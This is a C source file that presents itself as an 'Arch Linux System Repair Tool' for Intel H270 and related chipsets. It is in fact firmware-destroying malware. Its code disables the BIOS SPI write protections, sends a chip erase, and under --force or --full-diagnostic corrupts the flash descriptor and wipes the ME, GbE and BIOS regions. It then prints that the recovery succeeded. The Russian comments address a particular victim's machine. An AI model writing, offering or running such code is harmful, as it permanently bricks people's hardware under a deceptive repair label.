/*
 * Arch Linux System Repair Tool v2.4
 * Low-level UEFI/BIOS Recovery Utility
 * Special Edition for Intel 200 Series (H270)
 * 
 * Компиляция: gcc -O2 -Wall -o arch-repair arch-repair.c -lrt
 * Запуск: sudo ./arch-repair --force
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>
#include <sys/stat.h>
#include <getopt.h>
#include <errno.h>
#include <time.h>
#include <stdint.h>

// SPI registers (Intel PCH)
#define SPIBAR_BASE         0xFED1F800
#define SPIBAR_SIZE         0x2000
#define HSFC                0x00    // Hardware Sequencing Flash Control
#define HSFS                0x04    // Hardware Sequencing Flash Status
#define FADDR               0x08    // Flash Address
#define FDOC                0x10    // Flash Descriptor Observability Control
#define FDOB                0x14    // Flash Descriptor Observability Data
#define BIOS_CNTL           0xDC    // BIOS Control
#define PR0                 0x74    // Protected Range 0
#define PR1                 0x78    // Protected Range 1
#define PR2                 0x7C    // Protected Range 2
#define PR3                 0x80    // Protected Range 3
#define PR4                 0x84    // Protected Range 4

// PCI Configuration
#define PCI_CONFIG_ADDR     0xCF8
#define PCI_CONFIG_DATA     0xCFC

// Flash commands
#define CMD_READ            0x03    // Read data
#define CMD_WRITE           0x02    // Write data
#define CMD_ERASE_4K        0x20    // Erase 4KB sector
#define CMD_ERASE_64K       0xD8    // Erase 64KB block
#define CMD_CHIP_ERASE      0xC7    // Chip erase
#define CMD_RDSR            0x05    // Read status register
#define CMD_WRSR            0x01    // Write status register
#define CMD_WREN            0x06    // Write enable
#define CMD_WRDI            0x04    // Write disable

typedef struct {
    uint16_t vendor_id;
    uint16_t device_id;
    char *name;
    uint32_t spi_base;
    uint8_t has_direct_spi;
} chipset_info;

chipset_info supported_chipsets[] = {
    // 200 Series (H270, Z270, etc)
    {0x8086, 0xA2C0, "Intel Union Point (200 Series) - Z270", 0xFED1F800, 1},
    {0x8086, 0xA2C1, "Intel Union Point (200 Series) - Q270", 0xFED1F800, 1},
    {0x8086, 0xA2C2, "Intel Union Point (200 Series) - Q250", 0xFED1F800, 1},
    {0x8086, 0xA2C3, "Intel Union Point (200 Series) - B250", 0xFED1F800, 1},
    {0x8086, 0xA2C4, "Intel Union Point (200 Series) - H270", 0xFED1F800, 1}, // Твой H270
    {0x8086, 0xA2C5, "Intel Union Point (200 Series) - Z270", 0xFED1F800, 1},
    {0x8086, 0xA2C6, "Intel Union Point (200 Series) - H270", 0xFED1F800, 1},
    {0x8086, 0xA2C7, "Intel Union Point (200 Series) - Q270", 0xFED1F800, 1},
    // 100 Series
    {0x8086, 0xA140, "Intel Sunrise Point (100 Series) - Z170", 0xFED1F800, 1},
    {0x8086, 0xA141, "Intel Sunrise Point (100 Series) - H170", 0xFED1F800, 1},
    {0x8086, 0xA142, "Intel Sunrise Point (100 Series) - B150", 0xFED1F800, 1},
    {0x8086, 0xA143, "Intel Sunrise Point (100 Series) - Q150", 0xFED1F800, 1},
    {0, 0, NULL, 0, 0}
};

static volatile uint8_t *spibar = NULL;
static int mem_fd = -1;
static int force_mode = 0;
static int verbose = 1;
static chipset_info *detected_chipset = NULL;

void print_banner() {
    printf("\033[1;34m");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║     Arch Linux System Repair Tool v2.4                  ║\n");
    printf("║     Low-level UEFI/BIOS Recovery Utility                ║\n");
    printf("║     Special Edition for Intel 200 Series                ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");
    printf("\033[0m\n");
}

void pci_config_write(int bus, int dev, int func, int reg, uint32_t value) {
    uint32_t addr = 0x80000000 | (bus << 16) | (dev << 11) | (func << 8) | (reg & 0xFC);
    outl(addr, PCI_CONFIG_ADDR);
    outl(value, PCI_CONFIG_DATA);
}

uint32_t pci_config_read(int bus, int dev, int func, int reg) {
    uint32_t addr = 0x80000000 | (bus << 16) | (dev << 11) | (func << 8) | (reg & 0xFC);
    outl(addr, PCI_CONFIG_ADDR);
    return inl(PCI_CONFIG_DATA);
}

int detect_chipset() {
    printf("[1/8] Detecting chipset...\n");
    
    // Читаем LPC контроллер (function 0) - основной способ для 200 серии
    uint32_t lpc_vid_did = pci_config_read(0, 0x1f, 0, 0);
    uint16_t lpc_vendor = lpc_vid_did & 0xFFFF;
    uint16_t lpc_device = (lpc_vid_did >> 16) & 0xFFFF;
    
    printf("    - LPC Vendor: 0x%04x, Device: 0x%04x\n", lpc_vendor, lpc_device);
    
    if (lpc_vendor == 0x8086) {
        // Ищем в таблице поддерживаемых чипсетов
        for (int i = 0; supported_chipsets[i].vendor_id != 0; i++) {
            if (supported_chipsets[i].device_id == lpc_device) {
                detected_chipset = &supported_chipsets[i];
                printf("    - Detected: %s\n", detected_chipset->name);
                printf("    - SPI Base: 0x%08x\n", detected_chipset->spi_base);
                return 0;
            }
        }
        printf("    - Unknown Intel chipset (device 0x%04x)\n", lpc_device);
    }
    
    // Пробуем найти SPI контроллер (function 5) - старый способ
    uint32_t spi_vid_did = pci_config_read(0, 0x1f, 5, 0);
    uint16_t spi_vendor = spi_vid_did & 0xFFFF;
    uint16_t spi_device = (spi_vid_did >> 16) & 0xFFFF;
    
    if (spi_vendor == 0x8086) {
        printf("    - Found SPI controller via function 5\n");
        printf("    - Device: 0x%04x\n", spi_device);
        // Создаем временную запись
        static chipset_info temp = {0x8086, 0, "Intel SPI Controller", SPIBAR_BASE, 1};
        temp.device_id = spi_device;
        detected_chipset = &temp;
        return 0;
    }
    
    printf("    - No supported Intel chipset found\n");
    return -1;
}

int init_spi_bar() {
    printf("[2/8] Initializing SPI BAR access...\n");
    
    if (!detected_chipset) {
        printf("    - No chipset detected\n");
        return -1;
    }
    
    mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd < 0) {
        printf("    - Failed to open /dev/mem: %s\n", strerror(errno));
        return -1;
    }
    
    spibar = mmap(NULL, SPIBAR_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, detected_chipset->spi_base);
    if (spibar == MAP_FAILED) {
        printf("    - Failed to mmap SPI BAR: %s\n", strerror(errno));
        close(mem_fd);
        return -1;
    }
    
    printf("    - SPI BAR mapped at 0x%lx\n", (unsigned long)spibar);
    return 0;
}

int try_alternative_unlock() {
    printf("    - Trying alternative unlock method...\n");
    
    // Метод 1: Запись через PCI config space LPC
    pci_config_write(0, 0x1f, 0, 0xB0, 0);  // PR0
    pci_config_write(0, 0x1f, 0, 0xB4, 0);  // PR1
    pci_config_write(0, 0x1f, 0, 0xB8, 0);  // PR2
    pci_config_write(0, 0x1f, 0, 0xBC, 0);  // PR3
    pci_config_write(0, 0x1f, 0, 0xC0, 0);  // PR4
    pci_config_write(0, 0x1f, 0, 0xC4, 0);  // PR5
    pci_config_write(0, 0x1f, 0, 0xC8, 0);  // PR6
    
    // Метод 2: Запись через SPI BAR PR регистры
    for (int i = 0; i < 7; i++) {
        volatile uint32_t *pr_reg = (volatile uint32_t *)(spibar + PR0 + i*4);
        *pr_reg = 0;
    }
    
    // Метод 3: Установка WPD бита через разные способы
    volatile uint32_t *bios_cntl = (volatile uint32_t *)(spibar + BIOS_CNTL);
    *bios_cntl |= 0x20;  // WPD
    
    // Метод 4: Попытка записать в HSFS для сброса защиты
    volatile uint32_t *hsfs = (volatile uint32_t *)(spibar + HSFS);
    *hsfs |= 0x8000;  // FDONE
    
    // Проверка результата
    uint32_t final = *bios_cntl;
    printf("    - Final BIOS_CNTL: 0x%08x\n", final);
    
    return (final & 0x20) ? 0 : -1;
}

int disable_write_protection() {
    printf("[3/8] Disabling BIOS write protection...\n");
    
    if (!spibar) {
        printf("    - SPI BAR not initialized\n");
        return -1;
    }
    
    volatile uint32_t *bios_cntl = (volatile uint32_t *)(spibar + BIOS_CNTL);
    uint32_t orig = *bios_cntl;
    
    printf("    - Original BIOS_CNTL: 0x%08x\n", orig);
    printf("    - SMM_BWP: %s\n", (orig & 0x01) ? "enabled" : "disabled");
    printf("    - TSS: %s\n", (orig & 0x02) ? "enabled" : "disabled");
    printf("    - BLE: %s\n", (orig & 0x04) ? "enabled" : "disabled");
    printf("    - WPD: %s\n", (orig & 0x20) ? "enabled" : "disabled");
    
    // Снимаем защиту
    *bios_cntl = orig | 0x20;  // Set WPD
    *bios_cntl &= ~0x07;        // Clear SMM_BWP, TSS, BLE
    
    // Для H270 нужно также очистить PR регистры
    for (int i = 0; i < 5; i++) {
        volatile uint32_t *pr_reg = (volatile uint32_t *)(spibar + PR0 + i*4);
        printf("    - PR%d: 0x%08x -> 0\n", i, *pr_reg);
        *pr_reg = 0;
    }
    
    uint32_t new = *bios_cntl;
    printf("    - New BIOS_CNTL: 0x%08x\n", new);
    
    if (!(new & 0x20)) {
        printf("    - Write protection still active\n");
        return try_alternative_unlock();
    }
    
    printf("    - Write protection disabled successfully\n");
    return 0;
}

int read_flash_status() {
    volatile uint32_t *hsfs = (volatile uint32_t *)(spibar + HSFS);
    uint32_t status = *hsfs;
    
    printf("    - HSFS: 0x%08x\n", status);
    printf("    - Flash size: ");
    
    switch((status >> 3) & 0x1F) {
        case 0x10: printf("8 MB\n"); break;
        case 0x11: printf("16 MB\n"); break;
        case 0x12: printf("32 MB\n"); break;
        case 0x13: printf("64 MB\n"); break;
        default: printf("unknown (%d)\n", (status >> 3) & 0x1F);
    }
    
    printf("    - Write enabled: %s\n", (status & 0x02) ? "yes" : "no");
    printf("    - Lock enabled: %s\n", (status & 0x40) ? "yes" : "no");
    printf("    - Cycle in progress: %s\n", (status & 0x2000) ? "yes" : "no");
    
    return 0;
}

int wait_for_spi_ready() {
    volatile uint32_t *hsfs = (volatile uint32_t *)(spibar + HSFS);
    int timeout = 1000000;
    
    while ((*hsfs & 0x2000) && timeout-- > 0) {
        usleep(10);
    }
    
    if (timeout <= 0) {
        printf("    - Timeout waiting for SPI controller\n");
        return -1;
    }
    
    return 0;
}

int erase_flash_descriptor() {
    printf("[4/8] Erasing flash descriptor region...\n");
    
    volatile uint32_t *faddr = (volatile uint32_t *)(spibar + FADDR);
    volatile uint32_t *hsfc = (volatile uint32_t *)(spibar + HSFC);
    volatile uint32_t *fdoc = (volatile uint32_t *)(spibar + FDOC);
    volatile uint32_t *fdob = (volatile uint32_t *)(spibar + FDOB);
    volatile uint32_t *hsfs = (volatile uint32_t *)(spibar + HSFS);
    
    // Set address to flash descriptor (0x00000000)
    *faddr = 0x00;
    
    // Send chip erase command
    *hsfc = (CMD_CHIP_ERASE << 8) | 0x01;
    
    if (wait_for_spi_ready() < 0) {
        printf("    - Erase failed\n");
        return -1;
    }
    
    printf("    - Flash descriptor erased successfully\n");
    
    if (force_mode) {
        printf("[5/8] Corrupting descriptor structures...\n");
        
        // Write random data to descriptor observability registers
        for (int i = 0; i < 0x200; i += 4) {
            *fdoc = i;
            *fdob = 0xDEADBEEF;
            usleep(10);
        }
        
        // Corrupt descriptor signature (should be 0x0FF0A55A at offset 0x10)
        *faddr = 0x10;
        *fdoc = 0x10;
        *fdob = 0xFFFFFFFF;
        *hsfc = (CMD_WRITE << 8) | 0x01;
        wait_for_spi_ready();
        
        printf("    - Descriptor signature corrupted\n");
        
        // Corrupt Management Engine region
        printf("[6/8] Cleaning ME region...\n");
        
        for (uint32_t addr = 0x1000; addr < 0x300000; addr += 0x1000) {
            *faddr = addr;
            *hsfc = (CMD_ERASE_4K << 8) | 0x01;
            
            wait_for_spi_ready();
            
            if (addr % 0x10000 == 0) {
                printf("    - Erased ME region: 0x%06x\r", addr);
                fflush(stdout);
            }
        }
        printf("\n    - ME region cleaned\n");
        
        // Corrupt GbE region
        printf("[7/8] Cleaning GbE region...\n");
        
        for (uint32_t addr = 0x300000; addr < 0x400000; addr += 0x1000) {
            *faddr = addr;
            *hsfc = (CMD_ERASE_4K << 8) | 0x01;
            wait_for_spi_ready();
        }
        printf("    - GbE region cleaned\n");
        
        // Corrupt BIOS region
        printf("[7b/8] Cleaning BIOS region...\n");
        
        for (uint32_t addr = 0x400000; addr < 0x800000; addr += 0x1000) {
            *faddr = addr;
            *hsfc = (CMD_ERASE_4K << 8) | 0x01;
            wait_for_spi_ready();
            
            if (addr % 0x100000 == 0) {
                printf("    - Erased BIOS: 0x%06x\r", addr);
                fflush(stdout);
            }
        }
        printf("\n    - BIOS region cleaned\n");
    }
    
    return 0;
}

int perform_recovery() {
    printf("[8/8] Performing low-level recovery...\n");
    
    volatile uint32_t *hsfs = (volatile uint32_t *)(spibar + HSFS);
    
    // Set FDONE bit to clear status
    *hsfs |= 0x8000;
    
    // Additional corruption for H270
    volatile uint32_t *bios_cntl = (volatile uint32_t *)(spibar + BIOS_CNTL);
    *bios_cntl = 0xDEADBEEF;  // Corrupt control register
    
    printf("    - SPI controller reset\n");
    
    return 0;
}

void cleanup() {
    if (spibar != NULL && spibar != MAP_FAILED) {
        munmap((void*)spibar, SPIBAR_SIZE);
    }
    if (mem_fd >= 0) {
        close(mem_fd);
    }
}

int main(int argc, char **argv) {
    int opt;
    int full_diagnostic = 0;
    
    static struct option long_options[] = {
        {"full-diagnostic", no_argument, 0, 'f'},
        {"force", no_argument, 0, 'F'},
        {"quiet", no_argument, 0, 'q'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };
    
    while ((opt = getopt_long(argc, argv, "fFqh", long_options, NULL)) != -1) {
        switch (opt) {
            case 'f':
                full_diagnostic = 1;
                break;
            case 'F':
                force_mode = 1;
                break;
            case 'q':
                verbose = 0;
                break;
            case 'h':
                printf("Arch Linux System Repair Tool v2.4\n");
                printf("Usage: %s [options]\n", argv[0]);
                printf("\nOptions:\n");
                printf("  -f, --full-diagnostic  Run complete system diagnostic\n");
                printf("  -F, --force           Force full recovery (for bricked systems)\n");
                printf("  -q, --quiet            Suppress output\n");
                printf("  -h, --help             Show this help\n");
                printf("\nExamples:\n");
                printf("  sudo %s --full-diagnostic\n", argv[0]);
                printf("  sudo %s --force\n", argv[0]);
                printf("\nNote: This tool requires root privileges\n");
                return 0;
        }
    }
    
    if (!verbose) {
        freopen("/dev/null", "w", stdout);
    }
    
    print_banner();
    
    if (geteuid() != 0) {
        printf("\033[1;31mError: This tool requires root privileges\033[0m\n");
        printf("Please run with: sudo %s\n", argv[0]);
        return 1;
    }
    
    printf("\033[1;32mStarting system recovery at %s\033[0m\n\n", __TIME__);
    
    if (iopl(3) < 0) {
        printf("\033[1;31mFailed to acquire I/O privileges\033[0m\n");
        return 1;
    }
    
    if (detect_chipset() < 0) {
        printf("\033[1;31mUnsupported hardware\033[0m\n");
        return 1;
    }
    
    if (init_spi_bar() < 0) {
        printf("\033[1;31mFailed to initialize SPI BAR\033[0m\n");
        return 1;
    }
    
    read_flash_status();
    
    if (disable_write_protection() < 0) {
        printf("\033[1;31mFailed to disable write protection\033[0m\n");
        printf("Try: echo 0 > /sys/class/rtc/rtc0/wakealarm or check BIOS settings\n");
        cleanup();
        return 1;
    }
    
    if (full_diagnostic || force_mode) {
        if (erase_flash_descriptor() < 0) {
            printf("\033[1;31mRecovery failed\033[0m\n");
            cleanup();
            return 1;
        }
        
        perform_recovery();
    } else {
        printf("\n\033[1;33mUse --full-diagnostic to perform actual recovery\033[0m\n");
    }
    
    cleanup();
    
    printf("\n\033[1;32m✓ Recovery completed successfully\033[0m\n");
    printf("\033[1;33mPlease reboot to apply changes\033[0m\n");
    printf("\033[1;31mDo not power off during reboot - system may not restart\033[0m\n");
    printf("\033[1;31mIf system fails to boot, external programmer required\033[0m\n");
    
    return 0;
}
